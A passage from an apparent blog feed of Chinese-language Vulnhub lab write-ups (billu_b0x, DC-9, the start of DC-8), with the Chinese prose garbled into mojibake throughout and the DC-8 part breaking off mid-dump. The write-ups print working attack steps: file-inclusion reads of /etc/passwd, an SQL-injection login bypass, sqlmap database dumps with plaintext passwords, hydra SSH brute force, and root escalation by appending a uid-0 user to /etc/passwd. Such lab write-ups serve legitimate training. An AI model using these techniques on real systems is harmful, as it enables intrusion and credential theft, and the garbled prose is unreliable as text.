<h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><p>ä¼ ä¸€ä¸ªå›¾ç‰‡é©¬è¯•è¯•ï¼Œæˆ–è®¸åé¢ä¼šç”¨åˆ°</p>
<br>

<h4 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h4><p>åœ¨<code>test.php</code>getè¯·æ±‚ ä¼ å‚ <code>?file=/etc/passwd</code>æ²¡ååº”</p>
<p>ä½¿ç”¨postä¼ å‚<code>file=/etc/passwd</code>ä¼šå¼¹å‡ºä¸€ä¸ªä¸‹è½½æ–‡ä»¶çª—å£</p>
<p>æ–‡ä»¶å†…å®¹ä¸º<code>/etc/passwd</code>çš„è¾“å‡ºå†…å®¹</p>
<p>ä½¿ç”¨burpæŠ“åŒ…ï¼ŒæŠŠgetåŒ…æ”¹ä¸ºpoståŒ…</p>
<p><img src="/posts/827ecdf7/file_include1.png"></p>
<blockquote>
<p>ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</p>
</blockquote>
<p>å‘ç°ä¸€ä¸ª<code>ica</code>çš„ç”¨æˆ·ï¼Œå¯ä»¥ç™»å½•ssh</p>
<br>


<p>åŒæ—¶ç”¨è¿™ç§æ–¹æ³•å»ä¸‹è½½<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
<p><img src="/posts/827ecdf7/addphp.png"><br>åœ¨add.phpä¸­æœ‰æ–‡ä»¶ä¸Šä¼ çš„ä»£ç ï¼Œæ²¡æœ‰ç»è¿‡ä»»ä½•å¤„ç†ï¼Œå¯ä»¥è€ƒè™‘å»ä¸Šä¼ å›¾ç‰‡é©¬åœ¨in.phpä¸­æ˜¯phpinfoä¿¡æ¯</p>
<h4 id="åå°ç™»å½•"><a href="#åå°ç™»å½•" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h4><h5 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h5><p><img src="/posts/827ecdf7/cphp.png"><br>åœ¨c.phpä¸­å‘ç°äº†mysqlæ•°æ®åº“çš„è´¦æˆ·ä¿¡æ¯<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
<blockquote>
<p>ç”¨æˆ·å billuå¯†ç  b0x_billuæ•°æ®åº“å ica_lab</p>
</blockquote>
<p>ä½¿ç”¨è¿™ä¸ªè´¦æˆ·å»å°è¯•ç™»å½•phpmyadminï¼ŒæˆåŠŸç™»å½•,å¹¶å¾—åˆ°phpmyadminç‰ˆæœ¬ä¸º3.4.7ç™»å½•åå°æ€è·¯ä¸€ ä½¿ç”¨phpmyadminä¸­è´¦å·<br><img src="/posts/827ecdf7/auth.png"><br>åœ¨anthè¡¨ä¸­å¾—åˆ°ä¸€ä¸ªè´¦æˆ· biLLu hEx_itä½¿ç”¨æ­¤è´¦æˆ·æˆåŠŸç™»å½•åˆ°åå°</p>
<h5 id="æ€è·¯äºŒ-SQLæ³¨å…¥å†å°è¯•æŸ¥çœ‹index-phpçš„æºç "><a href="#æ€è·¯äºŒ-SQLæ³¨å…¥å†å°è¯•æŸ¥çœ‹index-phpçš„æºç " class="headerlink" title="æ€è·¯äºŒ SQLæ³¨å…¥å†å°è¯•æŸ¥çœ‹index.phpçš„æºç "></a>æ€è·¯äºŒ SQLæ³¨å…¥å†å°è¯•æŸ¥çœ‹index.phpçš„æºç </h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>å‰é¢ä½¿ç”¨str_replace å°†å•å¼•å·å…¨éƒ¨è¿‡æ»¤æ‰äº†ï¼Œ<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>è¾“å…¥<code>pass=admin\   uname= or 1=1 --+</code><br>å³ <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>æˆåŠŸç™»å½•æ–‡ä»¶ä¸Šä¼ <br><img src="/posts/827ecdf7/login.png"><br>å®¡è®¡ä¸€ä¸‹panel.php<br>é¡µé¢æœ‰ä¸¤ä¸ªåŠŸèƒ½ show users å’Œ add users å¯¹äºæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨äº†ç™½åå•æœºåˆ¶ï¼Œåªå…è®¸ä¸Šä¼ <code>jpeg,jpg,gif,png</code><br>å½“è¦ä¸Šä¼ ä¸€å¼ å›¾ç‰‡æ˜¯ï¼Œä¼šå…ˆåˆ¤æ–­åç¼€åæ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®ï¼Œè¿˜æœ‰ä¸€ä¸ªmimeéªŒè¯<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>å¯ä»¥çœ‹åˆ°ä¸Šä¼ å›¾ç‰‡çš„è·¯å¾„ä¸ºuploaded_images/</p>
<p>è¿™é‡Œä¼ é©¬å¤šæ¬¡éƒ½æ²¡ä¼ æˆåŠŸï¼Œæœ‰æ—¶é—´å†è¯•è¯•å§â€¦.</p>
<h4 id="å¾—åˆ°rootæƒé™æ€è·¯äºŒ"><a href="#å¾—åˆ°rootæƒé™æ€è·¯äºŒ" class="headerlink" title="å¾—åˆ°rootæƒé™æ€è·¯äºŒ"></a>å¾—åˆ°rootæƒé™æ€è·¯äºŒ</h4><p>phpmyadminçš„é…ç½®æ–‡ä»¶ä¸º<code>config.inc.php</code> ä½¿ç”¨ä»»æ„æ–‡ä»¶ä¸‹è½½å»ä¸‹è½½æ”¹é…ç½®æ–‡ä»¶<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>å¾—åˆ°ä¸€ä¸ªrootè´¦æˆ·root roottoorä½¿ç”¨sshç™»å½• ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#x31;&#52;&#52;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#x31;&#52;&#52;</a>æˆåŠŸç™»å½•rootç”¨æˆ·</p>
<p>Reference</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>vulhub</category>
      </categories>
      <tags>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges9</title>
    <url>/posts/73305909/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><blockquote>
<p>ç½‘æ®µ     192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>é¶æœº    192.168.18.142</p>
</blockquote>
<h4 id="æ‰«æç½‘æ®µ"><a href="#æ‰«æç½‘æ®µ" class="headerlink" title="æ‰«æç½‘æ®µ"></a>æ‰«æç½‘æ®µ</h4><blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00039s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.00043s latency).<br>MAC Address: 00:0C:29:C2:75:62 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00018s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds</p>
</blockquote>
<h4 id="æ‰«æé¶æœºç«¯å£"><a href="#æ‰«æé¶æœºç«¯å£" class="headerlink" title="æ‰«æé¶æœºç«¯å£"></a>æ‰«æé¶æœºç«¯å£</h4><blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.142 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:35 CST<br>Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 93.02% done; ETC: 20:36 (0:00:00 remaining)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.0014s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE    SERVICE VERSION<br>22/tcp filtered ssh<br>80/tcp open     http    Apache httpd 2.4.38 ((Debian))<br>MAC Address: 00:0C:29:C2:75:62 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds<br>kali@kali2020:~$ </p>
</blockquote>
<h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>å‘ç°ä¸€ä¸ªæœç´¢æ¡†å’Œç™»å½•æ¡†ï¼Œçœ‹ä¸‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot; --dbs --batch</code></p>
<p>å¾—åˆ°ä¸‰ä¸ªæ•°æ®åº“</p>
<blockquote>
<p>available databases [3]:<br>[*] information_schema<br>[*] Staff<br>[*] users</p>
</blockquote>
<p><code> sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users --tables</code></p>
<blockquote>
<p>Database: users<br>[1 table]<br>+â€”â€”â€”â€”-+<br>| UserDetails |<br>+â€”â€”â€”â€”-+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails --columns</code></p>
<blockquote>
<p>Database: users<br>Table: UserDetails<br>[6 columns]<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”â€“+<br>| Column    | Type            |<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”â€“+<br>| firstname | varchar(30)     |<br>| id        | int(6) unsigned |<br>| lastname  | varchar(30)     |<br>| password  | varchar(20)     |<br>| reg_date  | timestamp       |<br>| username  | varchar(30)     |<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”â€“+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code>ç»“æœå‘ç°è¿™æ˜¯displayé¡µé¢çš„ä¿¡æ¯æ¢å¦ä¸€ä¸ªè¡¨è·‘ä¸€ä¸‹</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff --tables</code></p>
<blockquote>
<p>Database: Staff<br>[2 tables]<br>+â€”â€”â€”â€”â€“+<br>| StaffDetails |<br>| Users        |<br>+â€”â€”â€”â€”â€“+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users --column</code></p>
<blockquote>
<p>Database: Staff<br>Table: Users<br>[3 columns]<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€“+<br>| Column   | Type            |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€“+<br>| Password | varchar(255)    |<br>| UserID   | int(6) unsigned |<br>| Username | varchar(255)    |</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users -C Username,Password  --dump</code></p>
<blockquote>
<p>Database: Staff<br>Table: Users<br>[1 entry]<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+<br>| Username | Password                         |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+</p>
</blockquote>
<p>è·‘å‡º<code>admin</code> <code>856f5de590ef37314e7c3bdf6f8a66dc</code></p>
<p>md5è§£å‡ºæ¥<code>transorbital1</code></p>
<p>è·‘å‡ºå¦ä¸€ä¸ªæ•°æ®åº“çš„æ•°æ®</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code></p>
<blockquote>
<p>Database: users<br>Table: UserDetails<br>[17 entries]<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”+<br>| username  | password      |<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”+<br>| marym     | 3kfs86sfd     |<br>| julied    | 468sfdfsd2    |<br>| fredf     | 4sfd87sfd1    |<br>| barneyr   | RocksOff      |<br>| tomc      | TC&amp;TheBoyz    |<br>| jerrym    | B8m#48sd      |<br>| wilmaf    | Pebbles       |<br>| bettyr    | BamBam01      |<br>| chandlerb | UrAG0D!       |<br>| joeyt     | Passw0rd      |<br>| rachelg   | yN72#dsd      |<br>| rossg     | ILoveRachel   |<br>| monicag   | 3248dsds7s    |<br>| phoebeb   | smellycats    |<br>| scoots    | YR3BVxxxw87   |<br>| janitor   | Ilovepeepee   |<br>| janitor2  | Hawaii-Five-0 |<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”+</p>
</blockquote>
<p>å»<code>manage.php</code>ç™»å½•ä¸‹è¯•è¯•,æˆåŠŸç™»å½•</p>
<p>é¡µé¢å·¦ä¸‹è§’æœ‰ä¸€ä¸ª<code> File does not exist</code>æ¨æµ‹æœ‰æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><img src="/posts/73305909/file_include_etcpasswd.png"></p>
<p><img src="/posts/73305909/Wappalyzer.png"></p>
<p>ä½¿ç”¨çš„apache</p>
<p><img src="/posts/73305909/apache.png"></p>
<p>ç”¨burp çˆ†ç ´äº†ä¸‹LFIå­—å…¸ æ²¡å‘ç°æœ‰ç”¨çš„ä¿¡æ¯</p>
<p><img src="/posts/73305909/intruder.png"></p>
<p>å»è¯•è¯•ä¹‹å‰è·‘å‡ºæ¥çš„ç”¨æˆ·è´¦å·èƒ½ä¸èƒ½sshç™»å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># username</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#passwd</span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br></pre></td></tr></table></figure>

<p><img src="/posts/73305909/ssh_connect_error.png"></p>
<p>å‘ç°å…¨æ˜¯è¿æ¥å¤±è´¥ï¼Œä½†æ˜¯nmapæ‰«æç«¯å£çš„æ—¶å€™22ç«¯å£æ˜¯å¼€æ”¾çš„</p>
<p>ç½‘ä¸Šæœäº†ä¸‹ï¼Œè¿™æ˜¯ä½¿ç”¨çš„<strong>knockæœåŠ¡(ç«¯å£æ•²é—¨æœåŠ¡)</strong> </p>
<h3 id="knockæœåŠ¡"><a href="#knockæœåŠ¡" class="headerlink" title="knockæœåŠ¡"></a>knockæœåŠ¡</h3><p>Knockdçš„é…ç½®æ–‡ä»¶è·¯å¾„ä¸º<code>/etc/knockd.conf</code></p>
<p><img src="/posts/73305909/knockd_conf.png"></p>
<p>å¼€æ”¾äº†<code>7469</code>,<code>8475</code>,<code>9842</code>ä¸‰ä¸ªç«¯å£</p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ22ç«¯å£æ˜¯å…³é—­çš„ï¼Œåªæœ‰è®¿é—®äº†ä»¥ä¸Šä¸‰ä¸ªç«¯å£åï¼Œ22ç«¯å£æ‰ä¼šå¼€æ”¾ã€‚</p>
<p>ä½¿ç”¨nmapè®¿é—®ä»¥ä¸Šä¸‰ä¸ªç«¯å£</p>
<p>è®¿é—®ååœ¨å»è¿æ¥sshï¼Œsshç«¯å£å¯ä»¥è®¿é—®</p>
<p><img src="/posts/73305909/ssh_connect.png"></p>
<p><img src="/posts/73305909/hydra1.png"></p>
<p>æœ€åè¯•å‡ºäº†ä¸‰ç»„å¯ä»¥sshç™»å½•çš„è´¦å·</p>
<blockquote>
<p>chandlerb   UrAG0D!<br>joeyt       Passw0rd<br>janitor     Ilovepeepee</p>
</blockquote>
<p><img src="/posts/73305909/ssh1.png"></p>
<p>åœ¨<code>janitor</code>ç”¨æˆ·ä¸‹å‘ç°ä¸€ä¸ªéšè—æ–‡ä»¶å¤¹ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªå¯†ç æœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># passwords-found-on-post-it-notes.txt </span><br><span class="line"></span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>

<p><img src="/posts/73305909/hydra2.png"></p>
<p>è·‘å‡ºäº†ä¸€ä¸ªè´¦å·</p>
<p><code>fredf</code> <code>B4-Tru3-001</code></p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p><img src="/posts/73305909/fredf_sudo.png"></p>
<p>ä¸éœ€è¦å¯†ç å¯ä»¥æ‰§è¡Œ<code>/opt/devstuff/dist/test/test</code></p>
<p><img src="/posts/73305909/testpy.png"></p>
<p>æç¤ºtestæ˜¯ä¸ªpyæ–‡ä»¶</p>
<p>æ‰¾ä¸€ä¸‹test.py</p>
<p><code>find / -name &quot;test.py&quot; 2&gt;/dev/null</code></p>
<p><img src="/posts/73305909/find_test.png"></p>
<p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶</p>
<blockquote>
<p>/opt/devstuff/test.py<br>/usr/lib/python3/dist-packages/setuptools/command/test.py</p>
</blockquote>
<p>ä¼°è®¡åªæœ‰ç¬¬ä¸€ä¸ªå¯ä»¥ç”¨å¾—ä¸Š</p>
<p><code>cat /opt/devstuff/test.py</code></p>
<p><img src="/posts/73305909/testpy1.png"></p>
<p>éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼ŒæŠŠç¬¬ä¸€ä¸ªå‚æ•°çš„å†…å®¹è¿½åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶ä¸­</p>
<p>ä½¿ç”¨opensslåˆ›å»ºä¸€ä¸ªç”¨æˆ·</p>
<p><code> openssl  passwd -1 -salt Mamor 123456</code><br><code>$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/</code></p>
<p>æ„é€ ä¸€ä¸ªç”¨æˆ·</p>
<p><code>Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash</code></p>
<p>echo â€œMamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bashâ€ &gt; /tmp/mamor</p>
<p>sudo ./test /tmp/mamor /etc/passswd</p>
<p>æ„é€ å¤±è´¥æ²¡æ³•å†™å…¥</p>
<p><code>cat  /tmp/mamor </code></p>
<p><img src="/posts/73305909/usercreate_error.png"></p>
<p>å‘ç°å†™å…¥çš„æ•°æ®å¹¶ä¸æ˜¯åŸæ•°æ®</p>
<p>æ¢<code>&#39;</code>è¯•è¯•</p>
<p><code>echo &#39;Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash&#39; &gt; /tmp/mamor1</code></p>
<p><img src="/posts/73305909/usercreate.png"></p>
<p>è¿˜æ˜¯æ²¡æ³•å†™å…¥</p>
<p><code>openssl passwd -1 -salt test test</code></p>
<blockquote>
<p>$1$test$pi/xDtU5WFVRqYS6BMU8X/</p>
</blockquote>
<p><code>echo &#39;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash&#39; &gt;&gt; /tmp/testtest</code></p>
<p><code>sudo ./test /tmp/testtest /etc/passwd</code></p>
<p><code>cat /etc/passwd</code></p>
<blockquote>
<p>test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash</p>
</blockquote>
<p>è¿™æ¬¡å†™å…¥æˆåŠŸ</p>
<p><img src="/posts/73305909/flag.png"></p>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges8</title>
    <url>/posts/437699f/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><blockquote>
<p>ç½‘æ®µ     192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>é¶æœº        192.168.18.141</p>
</blockquote>
<h4 id="æ‰«æç½‘æ®µ"><a href="#æ‰«æç½‘æ®µ" class="headerlink" title="æ‰«æç½‘æ®µ"></a>æ‰«æç½‘æ®µ</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali çš„å¯†ç ï¼š<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
</blockquote>
<h4 id="æ‰«æé¶æœº"><a href="#æ‰«æé¶æœº" class="headerlink" title="æ‰«æé¶æœº"></a>æ‰«æé¶æœº</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
</blockquote>
<h4 id="dirsearchæ‰«ç›®å½•"><a href="#dirsearchæ‰«ç›®å½•" class="headerlink" title="dirsearchæ‰«ç›®å½•"></a>dirsearchæ‰«ç›®å½•</h4><blockquote>
<p>sudo python3 dirsearch -u 192.168.18.141</p>
</blockquote>
<p>æ²¡æ‰«åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œæ¢dirbæ‰«åˆ°äº†</p>
<p><code>http://192.168.18.141/user</code></p>
<h3 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h3><p>è¿›å…¥ä¸»é¡µ,ç‚¹å·¦ä¾§çš„Detailsä¸‹çš„é“¾æ¥ï¼Œå‘ç°urlå¤„æœ‰ä¸ªnidçš„å‚æ•°ï¼Œçœ‹çœ‹è¿™é‡Œæ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p>
<p>sqlmapè·‘ä¸€ä¸‹</p>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
<blockquote>
<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
</blockquote>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
<blockquote>
<p> Database: d7db<br>[88 tables]<br>+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+</p>
</blockquote>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
<blockquote>
<p> Database: d7db<br>Table: users<br>[16 columns]<br>+â€”â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”+<br>| Column           | Type             |<br>+â€”â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
</blockquote>
<br>

<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
<blockquote>
